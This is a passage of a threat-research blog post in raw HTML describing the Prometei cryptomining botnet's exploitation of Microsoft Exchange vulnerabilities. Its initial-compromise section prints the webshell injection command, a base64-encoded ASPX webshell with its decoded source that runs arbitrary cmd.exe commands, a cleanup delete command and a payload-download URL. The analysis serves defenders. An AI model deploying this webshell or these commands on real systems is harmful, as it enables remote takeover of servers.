<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Lior Rochberger">
    <meta name="description" content="The multi-stage cryptocurrency botnet has been observed exploiting the Microsoft Exchange vulnerabilities associated with the HAFNIUM attacks to penetrate networks...">
    <meta name="generator" content="HubSpot">
    <title>Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities</title>
    <link rel="shortcut icon" href="https://www.cybereason.com/hubfs/cr-favicon-1.png">
    
<meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="The multi-stage cryptocurrency botnet has been observed exploiting the Microsoft Exchange vulnerabilities associated with the HAFNIUM attacks to penetrate networks...">
    <meta property="og:title" content="Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities">
    <meta name="twitter:description" content="The multi-stage cryptocurrency botnet has been observed exploiting the Microsoft Exchange vulnerabilities associated with the HAFNIUM attacks to penetrate networks...">
    <meta name="twitter:title" content="Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/41681847227/1741488491170/module_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/41682410610/1741488492472/module_CR_-_Malicious_Life_Network_--_Main_Hero.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/48386556055/1741488537305/module_CR_-_HTML_PopUp_Window_--_IOCs.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/43300360745/1741488505140/module_CR_-_Malicious_Life_Network_--_Related_Posts.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/86933076631/1741488758324/module_CR_-_Sticky_CTA_Bar.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/34473990280/1740999337265/module_CR_-_Footer_Full__en_US.min.css">
    

    
<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-TJVVB7C');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->


<script src="https://use.typekit.net/vyv2ljd.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="preload" href="/hubfs/__dam/fonts/ionicons.eot" as="font" type="font/otf" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Regular.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Medium.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/peristyle/Peristyle-Black.woff2" as="font" type="font/woff2" crossorigin>
<link rel="amphtml" href="https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities?hs_amp=true">

<meta property="og:image" content="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/Prometei-botnet-featured-blog-image.png">
<meta property="og:image:width" content="1000">
<meta property="og:image:height" content="522">

<meta name="twitter:image" content="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/Prometei-botnet-featured-blog-image.png">


<meta property="og:url" content="https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:creator" content="@lior_rochberger">

<link rel="canonical" href="https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cybereason.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cybereason.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">
<link rel="stylesheet" href="//7052064.fs1.hubspotusercontent-na1.net/hubfs/7052064/hub_generated/template_assets/DEFAULT_ASSET/1742497832005/template_layout.min.css">


<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/34470223313/1741528336747/template_cr-master__cta.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/34470477360/1736810313166/template_cr-master__main.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/35275979682/1741528339661/template_ionicons.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/42760289143/1741528346957/template_cr-mln__build.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/34470224480/1741528337131/template_cr-framework__bulma-columns.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/35291999472/1741528340159/template_cr-framework__bulma.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/42363645447/1741528345735/template_hamburger-animation.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/42507091846/1741528346726/template_animate.min.css">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
<script src="/hubfs/dam/plugins/marker-animation.js"></script>
<script>
$(document).ready(function() {
  $('.highlight').markerAnimation({
    "color":'var(--cr-yellow)',
    "font_weight":'normal',
    "background-size": '200% 1.2em'
  });
});
</script>

    <style>
.cr-mln__blog-post .container-is-blog.cr-mln__blog-post--body .column:nth-of-type(2) img {
    background: #FFFFFF;
    border: 1px solid #CCCCCC;
    border-radius: 5px 5px 5px 5px;
    padding: 10px;
} 
</style>

</head>
<body class="   hs-content-id-45555647643 hs-blog-post hs-blog-id-5272851739" style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJVVB7C" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433790649568" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section id="cr-malicious-life-network__tier-one-header" class="position-flex">
  <div class="#">
    <div id="logo"><a href="https://www.cybereason.com"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-black.png"></a></div>
    <div id="back-to">
      <a href="https://www.cybereason.com">Back to <span>Cybereason.com</span></a>
    </div>
    <!-- Hamburger Menu -->
    <button class="hamburger hamburger--collapse" type="button">
      <span class="hamburger-box">
        <span class="hamburger-inner"></span>
      </span>
    </button>
    <div class="cr-mln__hamburger-menu--overlay">
      <ul>
        <li><a href="https://www.cybereason.com/blog/all"><span class="underline">All Posts</span></a></li>
        <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
        <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
        <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
        <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
        <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
        <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
      </ul>
      <div class="subscribe">
        <a href="#blog-subscribe">Subscribe</a>
      </div>
    </div>
    <!-- -->
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget mln-homepage" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433785464566" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__hero-main base">
  <div class="container-is-blog columns hero-content page-center">
    <div class="column is-5-fullhd is-5-desktop is-12-touch">
      <a href="/blog"><img class="cr-mln-logo" src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-malicious-life-logo-v2.png"></a>
    </div>
    <div class="column is-7-fullhd is-7-desktop is-hidden-mobile is-hidden-tablet-only">
      <div class="cr-mln__search-subscribe">
        <div class="cr-mln__search">
          <a href="#cr-search-modal" class="search-btn"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-blog-icon--search-dark-gray.png" alt="Search"></a>
        </div>
        <div class="cr-mln__subscribe">
          <a class="btn-subscribe" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>
      <div class="cr-mln__category-nav">
        <ul>
          <li><a href="/blog/category/all"><span class="underline">All</span></a></li>
          <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
          <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
          <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
          <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
          <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
          <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
        </ul>
      </div>
    </div>
  </div>
      <!-- MOBILE Search and Subscribe -->
      <div class="container-is-blog columns is-gapless is-hidden-desktop cr-mln__search-subscribe--mobile">
        <div class="column">
          <a class="search-btn">Search</a>
        </div>
        <div class="column">
          <a class="#" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>

      <!-- END MOBILE Search and Subscribe -->
  
  <!-- SEARCH Modal Wrap -->

  <div id="cr-search-modal">
        <!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID -->
        <div id="btn-close-modal" class="close-cr-search-modal"> 
            X
        </div>

        <div class="modal-content">
            <div class="container columns">
              <div class="column">
                <div class="cr-search-modal__search-bar">
                  <h3>Search</h3>
                  <form action="/hs-search-results">
                    <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search...">
                    <input type="hidden" name="type" value="BLOG_POST">
                    <input type="hidden" name="type" value="LISTING_PAGE">
                    <button type="submit" class="arrow"></button>
                  </form>
                  
                </div>

              </div>
          </div>
        </div>
    </div>
  <!-- END Search Modal Wrap -->

</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">







<div class="cr-mln__blog-post">
  <div class="container-is-blog columns is-multiline page-center">

    <div class="column is-8-fullhd is-8-desktop is-offset-2-fullhd is-offset-2-desktop is-10-tablet is-offset-1-tablet">
      <div class="featured-image"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/Prometei-botnet-featured-blog-image.png" alt=""></div>
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities</span></h1>
      <div class="cr-mln__post-author-share">
      <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
        
          <span class="descriptor">Written By</span>
          <p><span class="author">Lior Rochberger</span></p>
         
      </div>
    </div>
     
    </div>
    
    <!-- Sticky Author and Social Box -->
    
    <!-- END Sticky Author and Social Box -->
      <div class="container-is-blog columns is-multiline page-center cr-mln__blog-post--body">
        
        <div class="column is-7-fullhd is-7-desktop is-10-tablet is-10-mobile is-offset-1-fullhd is-offset-1-desktop is-offset-1-tablet is-offset-1-mobile">
          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Recently, the <a href="/blog/authors/cybereason-nocturnus" rel="noopener" target="_blank"><span>Cybereason Nocturnus Team</span></a> responded to several incident response (IR) cases involving infections of the Prometei Botnet against companies in North America, observing that the attackers exploited recently published Microsoft Exchange vulnerabilities (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065" rel="noopener" target="_blank"><span>CVE-2021-27065</span></a> and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858" rel="noopener" target="_blank"><span>CVE-2021-26858</span></a>) in order to penetrate the network and install malware.</p>
<!--more-->
<p>Prometei is a modular and multi-stage <a href="https://blog.talosintelligence.com/2020/07/prometei-botnet-and-its-quest-for-monero.html" rel="noopener" target="_blank"><span>cryptocurrency botnet that was first discovered in July 2020</span></a> which has both Windows and <a href="https://cujo.com/iot-malware-journals-prometei-linux/" rel="noopener" target="_blank"><span>Linux</span></a> versions. To achieve their goal of mining Monero coins, Prometei uses different techniques and tools, ranging from Mimikatz to SMB and RDP exploits and other tools that all work together to propagate across the network.</p>
<p>Although Prometei was officially discovered in mid-2020, the Cybereason Nocturnus Team found evidence that Prometei might date back as far as 2016 and has been evolving ever since, adding new modules and techniques to its capabilities. The latest versions of Prometei now provide the attackers with a sophisticated and stealthy backdoor that supports a wide range of tasks that make mining Monero coins the least of the victims' concerns.</p>
<p>This report will present the findings of our investigation of the attacks, including the initial foothold sequence of the attackers, the functionality of the different components of the malware, the threat actors’ origin and the bot’s infrastructure.</p>
<h3 style="font-weight: normal; font-size: 36px;">Key Findings</h3>
<p style="padding-left: 40px;"><strong>• Exploiting Microsoft Exchange Vulnerabilities: </strong><span style="font-weight: normal;">Prometei exploits the recently disclosed Microsoft <a href="/blog/malicious-life-podcast-bside-hafnium" rel="noopener" target="_blank">Exchange vulnerabilities associated with the HAFNIUM attacks</a> to penetrate the network for malware deployment, credential harvesting and more.</span></p>
<p style="padding-left: 40px;"><strong>• Wide range of Victims:</strong> The victimology is quite random and opportunistic rather than highly targeted, which makes it even more dangerous and widespread. Prometei has been observed to be active in systems across a variety of industries, including: Finance, Insurance, Retail, Manufacturing, Utilities, Travel, and Construction. It has been observed infecting networks in the U.S., UK and many other European countries, as well as countries in South America and East Asia. It was also observed that the threat actors appear to be explicitly avoiding infecting targets in former Soviet bloc countries.</p>
<p style="padding-left: 40px;"><strong>• Exploiting SMB and RDP Vulnerabilities: </strong>The main objective of Prometei is to install the Monero miner component on as many endpoints as it can. To do so, Prometei needs to spread across the network - and for that, it uses many techniques such as known exploits EternalBlue and BlueKeep, harvesting credentials, exploiting SMB and RDP exploits, and other components such as SSH client and SQL spreader.</p>
<p style="padding-left: 40px;"><strong>• Cross-Platform Threat: </strong>Prometei has both Windows-based and Linux-Unix based versions, and it adjusts its payload based on the detected operating system, on the targeted infected machines when spreading across the network.</p>
<p style="padding-left: 40px;"><strong>• Cybercrime with APT Flavor: </strong><span style="font-weight: normal;">Threat actors in the cybercrime community continue to adopt APT-like techniques and improve the efficiency of their operations. It is assessed that the Prometei group is financially motivated and operated by Russian-speaking individuals but is not backed by a nation-state. By exploiting the computing resources of multiple endpoints to mine bitcoin, the threat actors behind Prometei can earn hefty sums of cryptocurrency over time.</span></p>
<p style="padding-left: 40px;"><strong>• Resilient C2 Infrastructure: </strong>Prometei is built to interact with four different command and control (C2) servers which strengthens the botnet’s infrastructure and maintains continuous communications, making it more resistant to takedowns.</p>
<p style="padding-left: 40px;"><strong>• Older than it Seems: </strong>The Prometei Botnet was first discovered in July 2020, but new evidence shows it was seen in the wild as far back as 2016. The Prometei Botnet is continuously evolving, with new features and tools observed in the newer versions.</p>
<p>&nbsp;</p>
<h1><span style="font-size: 20px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=931&amp;name=prometei-blog-image-1.jpg" alt="prometei-blog-image-1" width="931" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 931px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=466&amp;name=prometei-blog-image-1.jpg 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=931&amp;name=prometei-blog-image-1.jpg 931w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=1397&amp;name=prometei-blog-image-1.jpg 1397w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=1862&amp;name=prometei-blog-image-1.jpg 1862w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=2328&amp;name=prometei-blog-image-1.jpg 2328w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-1.jpg?width=2793&amp;name=prometei-blog-image-1.jpg 2793w" sizes="(max-width: 931px) 100vw, 931px"></span></h1>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Attack sequence diagram</span></em></p>
<h3 style="font-weight: normal; font-size: 36px;">Initial Compromise: Exploitation of the Microsoft Exchange Vulnerability</h3>
<p>During the IR investigation, the Nocturnus Team was able to identify the initial compromise vector, in which the attackers exploited the recently discovered vulnerabilities in Microsoft Exchange server, which allowed them to perform remote code execution by exploiting the following CVEs: <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065" rel="noopener" target="_blank"><span>CVE-2021-27065</span></a> and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858" rel="noopener" target="_blank"><span>CVE-2021-26858</span></a>.</p>
<p>The attackers used this vulnerability to install and execute the <a href="https://gist.github.com/JohnHammond/0b4a45cad4f4ed3324939d72dc599883" rel="noopener" target="_blank"><span>China Chopper webshell</span></a> via the following commands:</p>
<table style="border-color: #99acc2; border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: none;">
<tbody>
<tr>
<td style="border: 1pt solid #000000; padding: 4px;">
<p>Set-OabVirtualDirectory with the Parameters: -ExternalUrl "http://f/&lt;script language="JScript" runat="server"&gt;function Page_Load(){eval(Request["NO9BxmCXw0JE"],"unsafe");}&lt;/script&gt;" -Identity "OAB (Default Web Site)"</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<div data-hs-responsive-table="true" style="overflow-x: auto; max-width: 100%; width: 100%; margin-left: auto; margin-right: auto; line-height: 2;">
<table style="width: 100%; border-collapse: collapse; table-layout: fixed; border: 1px solid #99acc2;">
<tbody>
<tr>
<td style="width: 50%; padding: 4px; border: 1px solid #99acc2;">
<p align="left" style="font-size: 16px; text-align: justify;"><span style="color: #2d3236;">$d=[System.Convert]::FromBase64String('PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVWaWV3U3RhdGU9ImZhbHNlIiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+DQo8JQ0KCXN0cmluZyBxID0gIiI7DQogICAgICAgIGlmIChSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJxIl0gIT0gbnVsbClxPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJxIl07DQogICAgICAgIGlmIChSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJxNjQiXSAhPSBudWxsKXE9IFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJxNjQiXSkpOw0KDQoNCglSZXNwb25zZS5Xcml0ZSgicnVueyIrcSsifSIpOw0KCWlmKHEhPSIiKSB7DQogICAgICAgICAgICAgICAgUHJvY2VzcyBwID0gbmV3IFByb2Nlc3MoKTsNCiAgICAgICAgICAgICAgICBwLlN0YXJ0SW5mby5DcmVhdGVOb1dpbmRvdyA9IHRydWU7DQogICAgICAgICAgICAgICAgcC5TdGFydEluZm8uRmlsZU5hbWUgPSAiY21kLmV4ZSI7DQogICAgICAgICAgICAgICAgcC5TdGFydEluZm8uQXJndW1lbnRzID0gIi9jICIgKyBxOw0KICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOw0KICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlOw0KICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9IHRydWU7DQogICAgICAgICAgICAgICAgcC5TdGFydCgpOw0KCQlSZXNwb25zZS5Xcml0ZShwLlN0YW5kYXJkT3V0cHV0LlJlYWRUb0VuZCgpICsgcC5TdGFuZGFyZEVycm9yLlJlYWRUb0VuZCgpKTsNCgkJUmVzcG9uc2UuRW5kKCk7DQogICAgICAgIH0gICAgICAgDQolPg==');[io.file]::WriteAllBytes('C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\&lt;file_name&gt;.aspx',$d);</span></p>
</td>
<td style="width: 50%; padding: 4px; border: 1px solid #99acc2;">
<p style="line-height: 1;">&lt;%@ Page Language="C#" EnableViewState="false" %&gt;</p>
<p style="line-height: 1;">&lt;%@ Import Namespace="System.Diagnostics" %&gt;</p>
<p style="line-height: 1;">&lt;%@ Import Namespace="System.IO" %&gt;</p>
<p style="line-height: 1;">&lt;%</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;string q = "";</p>
<p style="line-height: 1.25;">&nbsp;&nbsp;&nbsp;&nbsp;if (Request.QueryString["q"] != null)q= Request.QueryString["q"];</p>
<p style="line-height: 1.25;">&nbsp;&nbsp;&nbsp;&nbsp;if (Request.QueryString["q64"] != null)q= System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Request.QueryString["q64"]));</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;Response.Write("run{"+q+"}");</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;if(q!="") {</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process p = new Process();</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.StartInfo.CreateNoWindow = true;</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.StartInfo.FileName = "cmd.exe";</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.StartInfo.Arguments = "/c " + q;</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.StartInfo.UseShellExecute = false;</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.StartInfo.RedirectStandardOutput = true;</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.StartInfo.RedirectStandardError = true;</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.Start();</p>
<p style="line-height: 1.25;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response.End();</p>
<p style="line-height: 1;">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p style="line-height: 1;">%&gt;</p>
</td>
</tr>
</tbody>
</table>
</div>
<p>&nbsp;</p>
<p><span style="background-color: transparent; font-weight: 400;">Once the attackers gained access to the network, they deleted the .aspx webshell file to cover their tracks:</span></p>
<table style="border-color: #99acc2; border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: none;">
<tbody>
<tr>
<td style="border: 1pt solid #000000; padding: 4px;">
<p>cmd.exe /c del "C:\Program Files\Microsoft\Exchange Server\V15\\frontend\httpproxy\owa\auth\&lt;file_name&gt;.aspx"</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Using the webshell, the attackers launched a PowerShell that was then used to download a payload from the following URL:&nbsp;</p>
<p style="padding-left: 40px;">http://178.21.164[.]68/dwn.php?b64=1&amp;d=nethost64C.exe&amp;B=_AMD64,&lt;machine_name&gt;</p>
<p>The payload is then saved as C:\windows\zsvc.exe and executed. This is the start of the Prometei botnet execution:</p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=1013&amp;name=prometei-blog-image-2.png" alt="prometei-blog-image-2" width="1013" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 1013px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=507&amp;name=prometei-blog-image-2.png 507w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=1013&amp;name=prometei-blog-image-2.png 1013w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=1520&amp;name=prometei-blog-image-2.png 1520w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=2026&amp;name=prometei-blog-image-2.png 2026w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=2533&amp;name=prometei-blog-image-2.png 2533w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-2.png?width=3039&amp;name=prometei-blog-image-2.png 3039w" sizes="(max-width: 1013px) 100vw, 1013px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Attack tree of the initial infection vector as observed in the Cybereason XDR Platform</span></em></p>
<h3 style="font-size: 36px; font-weight: normal;">The Prometei Botnet&nbsp;</h3>
<p>When the first module of the botnet, <em>zsvc.exe</em>, is executed, it starts to “prepare the ground” for the other modules:</p>
<ul>
<li style="list-style-type: none;">
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="1"><span style="font-size: 18px;">It copies itself into C:\Windows with the name “sqhost.exe”</span></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li style="list-style-type: none;">
<ul>
